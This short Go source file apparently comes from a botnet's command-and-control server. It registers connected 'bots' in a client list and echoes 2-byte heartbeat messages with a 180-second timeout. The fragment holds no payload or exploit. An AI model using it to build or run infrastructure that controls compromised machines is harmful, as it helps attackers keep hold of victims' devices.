package slaves

import "time"

var CL *ClientList

func (b *Bot) Handle() {
	CL.AddClient(b)
	defer CL.DelClient(b)

	buf := make([]byte, 2)
	for {
		err := b.conn.SetDeadline(time.Now().Add(180 * time.Second))
		if err != nil {
			return
		}
		if n, err := b.conn.Read(buf); err != nil || n != len(buf) {
			return
		}
		if n, err := b.conn.Write(buf); err != nil || n != len(buf) {
			return
		}
	}
}
